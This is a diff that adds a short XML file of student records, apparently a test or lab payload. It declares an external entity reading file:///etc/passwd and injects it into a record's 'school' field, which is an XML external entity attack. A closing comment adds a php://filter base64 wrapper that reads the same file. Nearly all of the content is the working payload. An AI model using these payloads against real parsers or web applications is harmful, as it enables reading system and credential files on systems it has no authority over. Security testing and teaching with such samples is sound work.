@@ -1,0 +1,13 @@
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<students>
+  <student>
+    <name>Phuc</name>
+    <birth_year>2002</birth_year>
+    <school>&xxe;</school>
+  </student>
+</students>
+
+<!-- php://filter/convert.base64-encode/resource=/etc/passwd -->
